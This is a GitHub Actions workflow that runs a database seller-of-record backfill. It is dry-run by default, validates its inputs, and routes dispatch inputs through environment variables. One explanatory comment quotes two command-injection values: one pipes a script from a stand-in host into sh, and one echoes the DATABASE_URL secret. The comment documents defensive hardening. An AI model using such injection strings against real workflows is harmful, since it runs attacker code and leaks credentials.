name: ADR-009 Rekey Flip

# On-demand execution channel for the A9-4 seller-of-record flip
# (scripts/backfill_seller_of_record.py). Exists as a workflow for the same
# reason as adr009-rekey-verify.yml: GitHub's runners reach the database
# reliably while the Railway public proxy and ssh edge degrade for hours at
# a time (2026-08-07/08 — a founder-run canary session died at the ssh
# handshake, and three follow-up probes never connected).
#
# DRY-RUN unless the `execute` input is explicitly true. Every batch is a
# single transaction with in-transaction parity assertions, and progress
# checkpoints in a9_4_backfill_checkpoint — a run killed mid-flight loses at
# most the in-progress batch and resumes where it stopped. After ANY execute
# run, dispatch adr009-rekey-verify.yml for the independent verdict; the
# tool never grades its own writes.

on:
  workflow_dispatch:
    inputs:
      execute:
        description: "Perform writes (false = read-only dry-run)"
        type: boolean
        default: false
      batch_size:
        description: "Products per catalog batch"
        default: "200"
      max_batches:
        description: "Stop after N batches (0 = run to completion)"
        default: "5"
      phases:
        description: "Comma-separated phases"
        default: "catalog"

# One flip at a time; a second dispatch queues instead of interleaving writes.
concurrency:
  group: adr009-rekey-flip
  cancel-in-progress: false

jobs:
  rekey-flip:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    env:
      DATABASE_URL: ${{ secrets.DATABASE_URL }}
      DB_POOL_MIN_SIZE: "1"
      DB_POOL_MAX_SIZE: "2"
      PYTHONDONTWRITEBYTECODE: "1"
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install deps
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      # Inputs reach the shell through `env:`, never `${{ }}` inside the body.
      # Interpolation is textual substitution performed BEFORE the shell parses
      # the script, so a dispatch value like `x; curl evil.sh | sh` executes with
      # the runner's DATABASE_URL in scope. This is the exact class
      # tests/test_workflow_no_run_body_interpolation.py exists to reject — and
      # the same escalation that was recorded on content-canonical-election.yml,
      # where `x"; echo $DATABASE_URL; #` in a dispatch input printed the secret.
      # (That workflow was deleted 2026-08-26 when its lane moved to a Cloud Run
      # Job; the finding is restated here rather than left as a dead pointer.)
      # As env vars the values are data: the shell expands them after parsing,
      # and quoting keeps them one argument each.
      - name: Run flip
        env:
          FLIP_PHASES: ${{ inputs.phases }}
          FLIP_BATCH_SIZE: ${{ inputs.batch_size }}
          FLIP_MAX_BATCHES: ${{ inputs.max_batches }}
          FLIP_EXECUTE: ${{ inputs.execute }}
        run: |
          set -euo pipefail
          # Validate before use: these become CLI arguments, so anything that is
          # not a plain integer / known phase token is refused rather than passed
          # along.
          [ -n "$FLIP_PHASES" ] || { echo "::error::phases must not be empty"; exit 1; }
          for tok in $(printf '%s' "$FLIP_PHASES" | tr ',' ' '); do
            case "$tok" in
              seeds|barekey|catalog|edges|repair-listings) ;;
              *) echo "::error::unknown phase token: $tok"; exit 1 ;;
            esac
          done
          case "$FLIP_BATCH_SIZE" in
            ''|*[!0-9]*) echo "::error::batch_size must be an integer"; exit 1 ;;
          esac
          case "$FLIP_MAX_BATCHES" in
            ''|*[!0-9]*) echo "::error::max_batches must be an integer"; exit 1 ;;
          esac

          set -- --phases "$FLIP_PHASES" --batch-size "$FLIP_BATCH_SIZE" \
                 --report a9_4_flip_report.json
          if [ "$FLIP_MAX_BATCHES" != "0" ]; then
            set -- "$@" --max-batches "$FLIP_MAX_BATCHES"
          fi
          if [ "$FLIP_EXECUTE" = "true" ]; then
            echo "::warning::EXECUTE run — production writes"
            set -- "$@" --execute
          fi
          python -m scripts.backfill_seller_of_record "$@"

      - name: Show report
        if: always()
        run: |
          if [ -f a9_4_flip_report.json ]; then
            cat a9_4_flip_report.json
          else
            echo "no report written (run died before reporting)"
          fi

      - name: Upload report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: a9-4-flip-report-${{ github.run_id }}
          path: a9_4_flip_report.json
          if-no-files-found: ignore
